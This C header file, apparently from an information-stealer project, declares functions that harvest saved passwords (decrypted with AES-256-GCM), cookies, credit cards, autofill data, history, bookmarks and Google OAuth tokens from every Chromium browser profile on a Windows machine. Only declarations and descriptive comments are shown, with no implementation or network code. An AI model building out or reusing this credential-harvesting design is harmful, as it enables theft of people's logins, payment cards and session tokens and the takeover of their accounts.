#ifndef CHROMIUM_H
#define CHROMIUM_H

#include <stddef.h>

typedef struct {
    char *browser_name;
    char *profile_name;
    char **logins;
    size_t login_count;
    char **cookies;
    size_t cookie_count;
    char **cards;
    size_t card_count;
    char **history;
    size_t history_count;
    char **autofill;
    size_t autofill_count;
    char **bookmarks;
    size_t bookmark_count;
    char **google_tokens;
    size_t google_token_count;
} BrowserData;

typedef struct {
    BrowserData *data;
    size_t count;
} CollectResult;

/*
 * Extract logins from a Chromium profile's Login Data SQLite database.
 * Reads origin_url, username_value, password_value from the logins table.
 * Passwords are decrypted with AES-256-GCM using the provided key.
 * Returns an array of tab-separated strings: "url\tuser\tpassword\n".
 */
char **extract_chromium_logins(const char *profile_path,
                               const unsigned char *key,
                               size_t *count);

/*
 * Extract cookies from a Chromium profile's Cookies SQLite database.
 * Reads host_key, name, path, encrypted_value, expires_utc.
 * Returns tab-separated strings: "host\tTRUE\tpath\tFALSE\texpires\tname\tvalue\n".
 */
char **extract_chromium_cookies(const char *profile_path,
                                const unsigned char *key,
                                size_t *count);

/*
 * Extract browsing history from a Chromium profile's History SQLite database.
 * Reads url, title, visit_count from the urls table.
 * Returns tab-separated strings: "title\turl\tvisit_count\n".
 */
char **extract_chromium_history(const char *profile_path, size_t *count);

/*
 * Extract credit cards from a Chromium profile's Web Data SQLite database.
 * Reads name_on_card, card_number_encrypted, expiration_month/year.
 * Returns tab-separated strings: "name\tnumber\tmonth\tyear\n".
 */
char **extract_chromium_cards(const char *profile_path,
                              const unsigned char *key,
                              size_t *count);

/*
 * Extract autofill data from a Chromium profile's Web Data SQLite database.
 * Reads name, value from the autofill table.
 * Returns tab-separated strings: "name\tvalue\n".
 */
char **extract_chromium_autofill(const char *profile_path, size_t *count);

/*
 * Extract bookmarks from a Chromium profile's Bookmarks JSON file.
 * Walks the bookmark_bar tree and extracts name+url pairs.
 * Returns tab-separated strings: "name\turl\n".
 */
char **extract_chromium_bookmarks(const char *profile_path, size_t *count);

/*
 * Extract Google OAuth tokens from a Chromium profile's Web Data SQLite database.
 * Reads service, encrypted_value from the token_service table.
 * Returns formatted strings: "Account ID: <aid>\nToken: <token>:<suffix>\n".
 */
char **extract_chromium_google_tokens(const char *profile_path,
                                      const unsigned char *key,
                                      size_t *count);

/*
 * Collect data from all Chromium browsers in LOCALAPPDATA and APPDATA.
 */
CollectResult collect_chromium(const char *local_app_data, const char *roaming_app_data);

/*
 * Free all memory allocated by collect_chromium.
 */
void free_browser_data(CollectResult *result);

#endif
